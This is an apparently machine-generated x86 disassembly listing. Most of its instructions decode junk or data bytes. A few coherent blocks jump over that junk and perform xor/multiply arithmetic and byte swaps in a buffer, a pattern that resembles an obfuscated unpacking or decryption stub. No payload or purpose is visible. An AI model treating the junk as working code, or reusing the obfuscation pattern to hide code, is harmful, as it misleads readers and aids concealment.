  408494:	jae    0x4084c4
  408496:	cmp    BYTE PTR [ebx],dl
  408498:	xlat   BYTE PTR ds:[ebx]
  408499:	pop    ds
  40849a:	push   ebp
  40849b:	bound  edx,QWORD PTR [ebx]
  40849d:	mov    cl,0x5c
  40849f:	loopne 0x40846d
  4084a1:	add    BYTE PTR [edi-0x6d],0x1a
  4084a5:	mov    al,0x28
  4084a7:	cwde   
  4084a8:	jae    0x4084e2
  4084aa:	mov    BYTE PTR [eax+0x4a],bh
  4084ad:	push   edx
  4084ae:	inc    edi
  4084af:	lods   al,BYTE PTR ds:[esi]
  4084b0:	adc    DWORD PTR [ecx+0x14],0x80cd593e
  4084b7:	mov    al,ds:0x17e3c68f
  4084bc:	sbb    dl,BYTE PTR [eax]
  4084be:	ss xchg ebp,eax
  4084c0:	sbb    al,0xec
  4084c2:	shl    BYTE PTR [eax*4+0x10f17260],0x22
  4084ca:	add    al,0x91
  4084cc:	xchg   esi,eax
  4084cd:	out    0xd9,al
  4084cf:	fisttp QWORD PTR [esi]
  4084d1:	push   eax
  4084d2:	(bad)  
  4084d3:	cmp    eax,0xdaeda3d6
  4084d8:	inc    edx
  4084d9:	cdq    
  4084da:	mov    WORD PTR [edx-0x10],?
  4084dd:	fild   QWORD PTR [eax+0x57]
  4084e0:	xchg   esp,eax
  4084e1:	add    DWORD PTR [ecx],ecx
  4084e3:	mov    ebp,0x50020d0
  4084e8:	jp     0x4084aa
  4084ea:	jp     0x4084e0
  4084ec:	out    0xa6,al
  4084ee:	(bad)
  4084f1:	push   edx
  4084f2:	sbb    DWORD PTR [ecx+0x2ac657bb],edi
  4084f8:	in     al,0x9f
  4084fa:	loope  0x40851e
  4084fc:	and    eax,0xf4f70887
  408501:	lods   al,BYTE PTR ds:[esi]
  408502:	inc    ebx
  408503:	cld    
  408504:	push   ecx
  408505:	out    dx,al
  408506:	xchg   bh,ch
  408508:	js     0x4084c2
  40850a:	mov    edi,DWORD PTR [edx*2+0x70fa698]
  408511:	inc    ecx
  408512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408513:	das    
  408514:	xchg   edi,eax
  408515:	ins    BYTE PTR es:[edi],dx
  408516:	fild   QWORD PTR [eax]
  408518:	aaa    
  408519:	(bad)  
  40851a:	mov    ?,WORD PTR [ecx+ebx*2]
  40851d:	jg     0x4084aa
  40851f:	aad    0x7a
  408521:	adc    eax,DWORD PTR [ebx-0x42]
  408524:	jnp    0x40854a
  408526:	sahf   
  408527:	adc    eax,0x5785f7f0
  40852c:	jno    0x4085aa
  40852e:	and    eax,DWORD PTR [eax-0x27]
  408531:	sbb    dh,BYTE PTR [esi-0x2412a3c7]
  408537:	mov    es,esp
  408539:	fild   QWORD PTR [ecx+0xaf48997]
  40853f:	retf   0x7771
  408542:	call   0x931f853a
  408547:	enter  0xdaf9,0x6d
  40854b:	or     BYTE PTR [esi],bl
  40854d:	pop    esi
  40854e:	lods   eax,DWORD PTR ds:[esi]
  40854f:	or     al,0x3
  408551:	cmp    eax,0x8d67b4f3
  408556:	icebp  
  408557:	sahf   
  408558:	cmp    al,0xc7
  40855a:	ins    DWORD PTR es:[edi],dx
  40855b:	ret    0xcad6
  40855e:	or     DWORD PTR [ebp-0x6c],ebx
  408561:	cdq    
  408562:	jbe    0x408522
  408564:	mov    eax,ds:0xb570e053
  408569:	xchg   ecx,eax
  40856a:	mov    al,0xfa
  40856c:	or     BYTE PTR [edi],bl
  40856e:	shr    DWORD PTR [edx],1
  408570:	cmc    
  408571:	pop    ds
  408572:	out    0xbd,al
  408574:	inc    edi
  408575:	ror    BYTE PTR [edx],0x4e
  408578:	jecxz  0x408530
  40857a:	bswap  ecx
  40857c:	xor    cl,BYTE PTR [eax]
  40857e:	sub    al,0x21
  408580:	adc    DWORD PTR [ebp-0x1b611f69],ecx
  408586:	stc    
  408587:	test   BYTE PTR [ebx],bh
  408589:	fimul  DWORD PTR [edi]
  40858b:	xchg   DWORD PTR [eax],ecx
  40858d:	add    BYTE PTR [eax],al
  40858f:	add    BYTE PTR [ebx-0x271633ab],cl
  408595:	add    DWORD PTR [eax],eax
  408597:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40859d:	cld    
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x1858353f
  4085c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085c5:	(bad)  
  4085c6:	loope  0x40859f
  4085c8:	jle    0x408648
  4085ca:	mov    bh,BYTE PTR [edi+0x7e]
  4085cd:	jle    0x4085e0
  4085cf:	stc    
  4085d0:	je     0x4085d5
  4085d2:	dec    esp
  4085d3:	inc    edi
  4085d4:	cmp    al,dh
  4085d6:	adc    eax,0x955c8204
  4085db:	sbb    bl,BYTE PTR [edi+0xb4a42d0]
  4085e1:	ret    
  4085e2:	mov    bh,0xcd
  4085e4:	add    DWORD PTR [ecx+eiz*8],edi
  4085e7:	adc    dl,al
  4085e9:	mov    edx,0x5043556
  4085ee:	add    edx,DWORD PTR [esi]
  4085f0:	adc    bl,BYTE PTR [ecx-0x42]
  4085f3:	scas   eax,DWORD PTR es:[edi]
  4085f4:	sar    BYTE PTR [ebx],cl
  4085f6:	sub    DWORD PTR [edi-0x3a],0x39
  4085fa:	hlt    
  4085fb:	out    0xc4,eax
  4085fd:	mov    dh,bh
  4085ff:	ins    DWORD PTR es:[edi],dx
  408600:	cmp    ebp,DWORD PTR [ecx-0x77]
  408603:	mov    bl,0xcc
  408605:	out    0xc0,eax
  408607:	inc    ebx
  408608:	mov    WORD PTR [eax+0x1f],ds
  40860b:	imul   eax,DWORD PTR [ebp-0xd],0x10968d64
  408612:	and    eax,0xdaaa5383
  408617:	les    ebp,FWORD PTR [esi]
  408619:	shr    BYTE PTR [ecx+0x65],cl
  40861c:	xchg   BYTE PTR [edx],bl
  40861e:	xor    bl,dh
  408620:	rcl    bh,1
  408622:	je     0x4086a3
  408624:	mov    ebx,DWORD PTR [ebx-0x77]
  408627:	ss xchg esp,eax
  408629:	aas    
  40862a:	pop    ebp
  40862b:	test   eax,0x46243705
  408630:	cmp    bh,dh
  408632:	mov    eax,0xc8b70195
  408637:	out    dx,eax
  408638:	out    dx,eax
  408639:	sub    dl,BYTE PTR [edx+0x7b3d9b0d]
  40863f:	xchg   ebp,eax
  408640:	outs   dx,DWORD PTR ds:[esi]
  408641:	and    bl,BYTE PTR [esi-0x6a]
  408644:	mov    cl,0xd8
  408646:	jo     0x408619
  408648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408649:	sti    
  40864a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40864b:	imul   eax,DWORD PTR [edi+edi*4],0x7a26b87f
  408652:	push   esi
  408653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408654:	mov    ch,0x54
  408656:	hlt    
  408657:	mov    edx,0xf8cf3ee1
  40865c:	enter  0xabae,0xce
  408660:	stos   DWORD PTR es:[edi],eax
  408661:	in     eax,0x19
  408663:	(bad)  
  408664:	pop    esp
  408665:	xchg   ebx,ecx
  408667:	(bad)  
  408668:	cdq    
  408669:	sbb    al,0x67
  40866b:	out    0xad,al
  40866d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40866e:	dec    ecx
  40866f:	sbb    al,0x1f
  408671:	addr16 push edi
  408673:	add    ah,BYTE PTR [eax]
  408675:	dec    ebx
  408676:	aam    0xb4
  408678:	pop    es
  408679:	js     0x408626
  40867b:	cld    
  40867c:	xor    ecx,DWORD PTR [esi-0x26]
  40867f:	jns    0x4086d4
  408681:	out    dx,eax
  408682:	ins    DWORD PTR es:[edi],dx
  408683:	out    0x4c,eax
  408685:	push   edi
  408686:	push   edi
  408687:	lahf   
  408688:	mov    bl,0x33
  40868a:	push   esp
  40868b:	cmp    eax,0x35408267
  408690:	fmul   st(0),st
  408692:	dec    edx
  408693:	ins    BYTE PTR es:[edi],dx
  408694:	sbb    al,0x16
  408696:	es push 0x9dde1ab3
  40869c:	mov    ds:0xa003fc62,al
  4086a1:	nop
  4086a2:	(bad)  
  4086a3:	arpl   WORD PTR [edx+eiz*1+0x402935ad],di
  4086aa:	out    dx,eax
  4086ab:	js     0x408647
  4086ad:	pushf  
  4086ae:	xchg   esp,eax
  4086af:	gs pusha 
  4086b1:	add    esi,DWORD PTR [eax-0x7315b1aa]
  4086b7:	rol    esi,1
  4086b9:	jne    0x4086fd
  4086bb:	mov    eax,0x3f03279f
  4086c0:	popa   
  4086c1:	lds    edx,FWORD PTR [ebx+0x5f]
  4086c4:	lea    esi,[ebx+edx*1]
  4086c7:	mov    eax,ds:0x76e11dd8
  4086cc:	out    dx,al
  4086cd:	pop    ebx
  4086ce:	pop    esp
  4086cf:	je     0x40870c
  4086d1:	mov    dh,0xe5
  4086d3:	cwde   
  4086d4:	cmp    ch,0x7e
  4086d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086d8:	push   eax
  4086d9:	jne    0x408741
  4086db:	hlt    
  4086dc:	test   BYTE PTR [ebx+eax*8],0xc3
  4086e0:	lahf   
  4086e1:	int    0x27
  4086e3:	(bad)  
  4086e5:	cmp    bh,BYTE PTR [ebx-0x48175e84]
  4086eb:	dec    ecx
  4086ec:	aas    
  4086ed:	mov    edi,0x9b7d84ec
  4086f2:	jo     0x40869d
  4086f4:	push   0x49
  4086f6:	scas   eax,DWORD PTR es:[edi]
  4086f7:	out    dx,al
  4086f8:	xor    ebp,esi
  4086fa:	xor    DWORD PTR [edi+0x69d330ed],esp
  408700:	adc    DWORD PTR [eax+0x2d74e3af],edx
  408706:	inc    eax
  408707:	mov    dh,0x1
  408709:	jne    0x4086fc
  40870b:	or     BYTE PTR [esi+eiz*1-0x66],ah
  40870f:	pop    ds
  408710:	mov    eax,0xdf534ff3
  408715:	push   ss
  408716:	mov    sp,0x6568
  40871a:	add    ebx,DWORD PTR cs:[eax-0x1b]
  40871e:	dec    DWORD PTR [esi]
  408720:	dec    ebp
  408721:	loopne 0x4086e9
  408723:	xchg   ebp,eax
  408724:	xor    BYTE PTR [ebp+0x4d],bl
  408727:	sub    DWORD PTR [ecx-0x79e395cb],0x1a
  40872e:	pop    esp
  40872f:	push   cs
  408730:	jl     0x408727
  408732:	pop    edi
  408733:	push   0xffffffa9
  408735:	icebp  
  408736:	adc    esi,esi
  408738:	(bad)  
  408739:	and    eax,0x4f185788
  40873e:	popa   
  40873f:	mov    ds:0x8e23ec89,eax
  408744:	push   0x41
  408746:	test   eax,0xeaed1fe6
  40874b:	mov    esi,0x636e1b00
  408750:	addr16 jno 0x4087b1
  408753:	push   0x27
  408755:	ins    DWORD PTR es:[edi],dx
  408756:	sbb    edi,esp
  408758:	out    0x91,eax
  40875a:	sub    BYTE PTR [edi-0x7b],bl
  40875d:	imul   esp,DWORD PTR [eax+eax*1],0xda3b6683
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	mov    cs,WORD PTR [edx]
  408849:	adc    esi,DWORD PTR [eax+0x7d]
  40884c:	aad    0x7e
  40884e:	jle    0x4087da
  408850:	jg     0x4088d0
  408852:	jle    0x40886a
  408854:	dec    esi
  408855:	aas    
  408856:	pop    ss
  408857:	inc    edx
  408858:	add    ecx,ebp
  40885a:	les    eax,FWORD PTR [edx+0x23]
  40885d:	pop    edi
  40885e:	mov    ebp,0xba466a34
  408863:	jmp    0x3ddf4ea8
  408868:	xor    DWORD PTR [esi+0x6cbf525e],0xffffffc9
  40886f:	jmp    0x1598:0xe75922c3
  408876:	xchg   DWORD PTR [edx],eax
  408878:	int    0xbc
  40887a:	rol    DWORD PTR [esi+0x69],cl
  40887d:	(bad)  
  40887f:	fmul   st(3),st
  408881:	sbb    esp,DWORD PTR [edx-0x71]
  408884:	jb     0x408855
  408886:	aaa    
  408887:	repnz xlat BYTE PTR ds:[ebx]
  408889:	mov    ah,BYTE PTR [esi+0x71e8e1c8]
  40888f:	std    
  408890:	sbb    ch,BYTE PTR [ecx+0x67]
  408893:	or     dh,BYTE PTR [esi]
  408895:	(bad)  
  408896:	mov    eax,ds:0x7477927
  40889b:	fistp  QWORD PTR [esi-0x1b3570c]
  4088a1:	push   esi
  4088a2:	mov    dh,0x69
  4088a4:	shl    DWORD PTR [edi+eax*4-0x63],cl
  4088a8:	stos   DWORD PTR es:[edi],eax
  4088a9:	ret    0x668a
  4088ac:	xchg   ecx,eax
  4088ad:	(bad)  
  4088ae:	dec    bh
  4088b0:	ror    edx,cl
  4088b2:	stos   BYTE PTR es:[edi],al
  4088b3:	pushf  
  4088b4:	pop    ds
  4088b5:	push   eax
  4088b6:	aad    0xe9
  4088b8:	sub    eax,0x1f386115
  4088bd:	(bad)
  4088c1:	cld    
  4088c2:	leave  
  4088c3:	je     0x40889e
  4088c5:	call   DWORD PTR [edx]
  4088c7:	mov    ds:0xbc73e4,eax
  4088cc:	ror    ebp,1
  4088ce:	inc    esp
  4088cf:	mov    edx,fs
  4088d1:	mov    bl,0x43
  4088d3:	mov    dh,0xe7
  4088d5:	jbe    0x40889b
  4088d7:	lods   eax,DWORD PTR ds:[esi]
  4088d8:	cli    
  4088d9:	xor    DWORD PTR [ebx],ecx
  4088db:	mov    WORD PTR [ecx-0x1a5776b1],?
  4088e1:	push   eax
  4088e2:	dec    esp
  4088e3:	jbe    0x4088c2
  4088e5:	cdq    
  4088e6:	cs mov ebx,0x748d24f3
  4088ec:	inc    ebx
  4088ed:	adc    bh,dl
  4088ef:	nop
  4088f0:	inc    esp
  4088f1:	dec    eax
  4088f2:	push   0x24
  4088f4:	dec    edi
  4088f5:	mov    ecx,0x67cebf04
  4088fa:	rcr    BYTE PTR [edi+eiz*2+0x3c3d7a8b],1
  408901:	loop   0x408932
  408903:	jmp    0x947e:0xcc3defa9
  40890a:	xor    eax,0xb92cf5d7
  40890f:	into   
  408910:	xor    eax,0xd50449c9
  408915:	push   ecx
  408916:	sti    
  408917:	sbb    cl,BYTE PTR [ebx+eax*1+0xf04c495]
  40891e:	fnsave [eax]
  408920:	cmp    DWORD PTR [edx-0x2d0e1701],edx
  408926:	jg     0x4089a3
  408928:	psrld  mm2,mm0
  40892b:	xchg   ebx,eax
  40892c:	add    BYTE PTR [ecx+0x32],dh
  40892f:	stos   BYTE PTR es:[edi],al
  408930:	adc    DWORD PTR [edx+0x1dba73e8],edi
  408936:	pop    es
  408937:	xchg   esi,eax
  408938:	mov    eax,ds:0xa98f820e
  40893d:	push   edx
  40893e:	dec    edx
  40893f:	pusha  
  408940:	inc    edi
  408941:	push   ebp
  408942:	mov    ?,WORD PTR [edi+0x64c43a1b]
  408948:	icebp  
  408949:	push   ebp
  40894a:	mov    edx,0x875a79d1
  40894f:	and    al,0xed
  408951:	sub    al,bl
  408953:	xlat   BYTE PTR ds:[ebx]
  408954:	enter  0x8810,0xb4
  408958:	dec    ebx
  408959:	call   0x8ffff712
  40895e:	stos   DWORD PTR es:[edi],eax
  40895f:	jnp    0x4089b0
  408961:	mov    ecx,0xdb25485c
  408966:	pop    ebx
  408967:	outs   dx,DWORD PTR ds:[esi]
  408968:	jo     0x408969
  40896a:	push   edi
  40896b:	mov    DWORD PTR [ebp-0x7f30c9e2],eax
  408971:	ror    DWORD PTR gs:[ebp+0x78],cl
  408975:	js     0x408949
  408977:	sbb    edi,edx
  408979:	add    edx,DWORD PTR [eax+ebp*2+0x4c]
  40897d:	sub    ecx,esi
  40897f:	xor    edi,DWORD PTR ds:0x3c23041a
  408985:	pop    ss
  408986:	cdq    
  408987:	dec    eax
  408988:	jno    0x4089b1
  40898a:	outs   dx,BYTE PTR ds:[esi]
  40898b:	sahf   
  40898c:	(bad)  
  40898d:	cs iret 
  40898f:	sti    
  408990:	es (bad) 
  408993:	aaa    
  408994:	retf   
  408995:	add    DWORD PTR [ecx+0x11],eax
  408998:	imul   ecx,DWORD PTR [eax+ebp*1+0x6a],0x51
  40899d:	cmp    eax,0x67592f97
  4089a2:	das    
  4089a3:	push   cs
  4089a4:	adc    eax,0xa8c4a6b1
  4089a9:	push   eax
  4089aa:	or     eax,0xe9dcfd40
  4089af:	cmp    bh,BYTE PTR [esi-0x620a9c18]
  4089b5:	mov    al,0xb8
  4089b7:	ror    cl,0x33
  4089ba:	in     al,dx
  4089bb:	inc    edi
  4089bc:	push   es
  4089bd:	or     al,0x2b
  4089bf:	jo     0x4089fd
  4089c1:	(bad)  
  4089c2:	jo     0x4089de
  4089c4:	in     al,dx
  4089c5:	pop    ds
  4089c6:	fcmovne st,st(3)
  4089c8:	push   0xdc6ba85c
  4089cd:	not    ebp
  4089cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089d0:	lds    edx,FWORD PTR [esi+0x28cdeed6]
  4089d6:	xor    eax,0x2246d6d1
  4089db:	lods   al,BYTE PTR ds:[esi]
  4089dc:	out    0x17,al
  4089de:	jp     0x408a0c
  4089e0:	add    eax,0x394adc0a
  4089e5:	cmp    BYTE PTR [ebx+esi*1],bh
  4089e8:	clc    
  4089e9:	add    edi,ecx
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a07:	test   BYTE PTR [ecx+0x7ed2898c],bl
  408a0d:	jle    0x408999
  408a0f:	jg     0x408a8f
  408a11:	jle    0x408a04
  408a13:	adc    DWORD PTR [edi+0x7c],0x8c2c480b
  408a1a:	mov    al,ds:0x9c419be4
  408a1f:	lock mov ah,BYTE PTR [edx+0x7474d541]
  408a26:	mov    dh,BYTE PTR ss:[ebp-0x14]
  408a2a:	lods   eax,DWORD PTR ds:[esi]
  408a2b:	jae    0x4089b7
  408a2d:	nop
  408a2e:	out    0xe1,al
  408a30:	fdivr  st,st(2)
  408a32:	cmp    eax,0x27710108
  408a37:	inc    edx
  408a38:	xchg   ecx,eax
  408a39:	scas   eax,DWORD PTR es:[edi]
  408a3a:	mov    DWORD PTR [edi-0x6f04a7c1],ebx
  408a40:	int3   
  408a41:	cdq    
  408a42:	mov    ds:0x2f9b826d,eax
  408a47:	fldcw  WORD PTR [edi+ebx*1-0x1d]
  408a4b:	pop    es
  408a4c:	pop    edx
  408a4d:	cwde   
  408a4e:	(bad)  
  408a4f:	mov    ds:0xb21097a1,eax
  408a54:	jmp    0xd3b7:0x9e87d60a
  408a5b:	stos   BYTE PTR es:[edi],al
  408a5c:	cdq    
  408a5d:	xor    ebx,0x6be566ba
  408a63:	or     eax,0x801feb09
  408a68:	inc    edx
  408a69:	call   0x4109:0xf0129701
  408a70:	lods   eax,DWORD PTR ds:[esi]
  408a71:	or     cl,BYTE PTR [edi]
  408a73:	mov    DWORD PTR [eax-0x9d168c3],esp
  408a79:	mov    dl,0x4e
  408a7b:	mov    cl,0x9a
  408a7d:	dec    ebp
  408a7e:	int    0x73
  408a80:	jmp    0x7eb1:0xa002f72b
  408a87:	fadd   st,st(5)
  408a89:	aad    0xce
  408a8b:	(bad)  
  408a8c:	fimul  WORD PTR ds:0x3360a6f4
  408a92:	jle    0x408ac1
  408a94:	lock ins DWORD PTR es:[edi],dx
  408a96:	jmp    0x56b3:0xfd9fca19
  408a9d:	popa   
  408a9e:	aam    0x9e
  408aa0:	ss clc 
  408aa2:	pop    ds
  408aa3:	test   eax,0x684642a7
  408aa8:	adc    BYTE PTR [edx],dl
  408aaa:	div    BYTE PTR [esi]
  408aac:	addr16 mov cl,0x53
  408aaf:	push   edx
  408ab0:	and    DWORD PTR [esi-0x15ff3405],ebx
  408ab6:	call   0xd1ce:0xfb78a70b
  408abd:	add    esp,DWORD PTR [edx-0x23]
  408ac0:	or     al,0x10
  408ac2:	xchg   edi,eax
  408ac3:	repz mov es,edx
  408ac6:	add    ebp,DWORD PTR [edx-0x3572c0bc]
  408acc:	out    0xbd,al
  408ace:	lds    eax,FWORD PTR [ebx+ecx*8-0x3a]
  408ad2:	ins    BYTE PTR es:[edi],dx
  408ad3:	(bad)  
  408ad4:	sbb    edi,ebx
  408ad6:	jno    0x408ac3
  408ad8:	mov    ebx,0x5e04f0cb
  408add:	out    0x60,eax
  408adf:	push   0xfffffff5
  408ae1:	ins    DWORD PTR es:[edi],dx
  408ae2:	repz in al,0x4d
  408ae5:	aam    0xc4
  408ae7:	pop    ebx
  408ae8:	push   edi
  408ae9:	stc    
  408aea:	pusha  
  408aeb:	sbb    ah,BYTE PTR [ebx-0x4cda1710]
  408af1:	ss jno 0x408ab5
  408af4:	pop    ebp
  408af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408af6:	cmp    eax,DWORD PTR [eax]
  408af8:	dec    eax
  408af9:	push   esp
  408afa:	dec    ebx
  408afb:	mov    eax,ds:0x62c3c3c2
  408b00:	push   esp
  408b01:	fidiv  WORD PTR [eax+0x34f5fd82]
  408b07:	xor    DWORD PTR [edi],ebp
  408b09:	mov    eax,0xf36107c6
  408b0e:	das    
  408b0f:	es push ebp
  408b11:	out    0x3b,al
  408b13:	and    ecx,DWORD PTR [esi+0x62]
  408b16:	out    0x1b,al
  408b18:	ror    cl,cl
  408b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b1c:	jns    0x408b48
  408b1e:	mov    bl,0x90
  408b20:	jnp    0x408b0c
  408b22:	jb     0x408b3a
  408b24:	call   0xe503043f
  408b29:	and    cl,bl
  408b2b:	xchg   ebx,eax
  408b2c:	pop    esi
  408b2d:	mov    ecx,0x31504705
  408b32:	sbb    eax,0x7ae710d9
  408b37:	mov    ecx,esi
  408b39:	in     al,0x80
  408b3b:	push   edi
  408b3c:	ins    BYTE PTR es:[edi],dx
  408b3d:	or     DWORD PTR [edx],eax
  408b3f:	mov    ds:0xae5d5b6b,eax
  408b44:	xchg   edx,eax
  408b45:	mov    bl,0xa5
  408b47:	jnp    0x408b50
  408b49:	jmp    0x408b16
  408b4b:	mov    dl,0xd5
  408b4d:	mov    ds:0xc71005c2,eax
  408b52:	xchg   esp,eax
  408b53:	mov    bl,0xcc
  408b55:	stos   DWORD PTR es:[edi],eax
  408b56:	pop    eax
  408b57:	sub    DWORD PTR gs:[esi-0x33e60c1d],esi
  408b5e:	jmp    0x442c8e8d
  408b63:	lds    edi,FWORD PTR [edx+0x33bff231]
  408b69:	pop    edx
  408b6a:	call   0x70f7:0x4083ef7e
  408b71:	push   esp
  408b72:	inc    ecx
  408b73:	dec    edx
  408b74:	push   esi
  408b75:	les    edi,FWORD PTR [edx]
  408b77:	outs   dx,BYTE PTR ds:[esi]
  408b78:	and    DWORD PTR [edx+edi*8],edx
  408b7b:	adc    bh,dh
  408b7d:	aam    0xad
  408b7f:	jecxz  0x408bfa
  408b81:	call   0x68b9:0xfb50fbc5
  408b88:	xor    al,0x84
  408b8a:	sbb    DWORD PTR [eax-0x433a2365],ecx
  408b90:	mov    ds:0x3928ca49,eax
  408b95:	lds    eax,FWORD PTR [edx-0xa]
  408b98:	bound  esp,QWORD PTR [ecx]
  408b9a:	adc    ch,al
  408b9c:	mov    al,ds:0xa4e8c033
  408ba1:	test   edx,edx
  408ba3:	pop    esp
  408ba4:	sbb    al,0x1f
  408ba6:	lea    edi,[edi+ebx*1+0x32729b]
  408bad:	cmp    edi,edx
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	out    0x54,al
  408bda:	hlt    
  408bdb:	push   ecx
  408bdc:	and    eax,0x8a7e7ed0
  408be1:	jg     0x408c61
  408be3:	jle    0x408b92
  408be5:	mov    WORD PTR [edx],gs
  408be7:	gs lahf 
  408be9:	jnp    0x408bf5
  408beb:	add    BYTE PTR [ebx-0x1],bl
  408bee:	push   ebx
  408bef:	cdq    
  408bf0:	mov    esi,0x6966e7f9
  408bf5:	in     al,0x59
  408bf7:	fistp  DWORD PTR [ebp+0x4e79012e]
  408bfd:	out    dx,eax
  408bfe:	xchg   esi,eax
  408bff:	sti    
  408c00:	fstp   DWORD PTR [ecx]
  408c02:	jne    0x408b87
  408c04:	pusha  
  408c05:	mov    ecx,0x9fce2880
  408c0a:	xor    ch,0x61
  408c0d:	jns    0x408bda
  408c0f:	pusha  
  408c10:	sub    DWORD PTR [edi+0x4d39b95b],ecx
  408c16:	sbb    bh,BYTE PTR ds:0xbaf9ec7d
  408c1c:	aad    0xc0
  408c1e:	popf   
  408c1f:	sub    ebp,ebp
  408c21:	xchg   ebp,eax
  408c22:	jecxz  0x408c75
  408c24:	mov    bl,0xe4
  408c26:	ss int3 
  408c28:	clc    
  408c29:	nop
  408c2a:	mov    ecx,0x21107cd1
  408c2f:	mov    ah,0x63
  408c31:	add    DWORD PTR [edx-0x78],edi
  408c34:	pop    esi
  408c35:	leave  
  408c36:	mov    al,ds:0x7fc824a2
  408c3b:	mov    esi,0x35fdeeba
  408c40:	sub    BYTE PTR [edx],0x63
  408c43:	inc    di
  408c45:	push   0x486757cf
  408c4a:	stc    
  408c4b:	cmp    eax,0x30edfc38
  408c50:	out    0xb0,eax
  408c52:	inc    edx
  408c53:	sub    bl,ch
  408c55:	mov    ah,0x4d
  408c57:	pop    ss
  408c58:	not    cl
  408c5a:	jns    0x408bf4
  408c5c:	fstp   QWORD PTR [esi]
  408c5e:	lds    esi,FWORD PTR [esi+0x45f7a792]
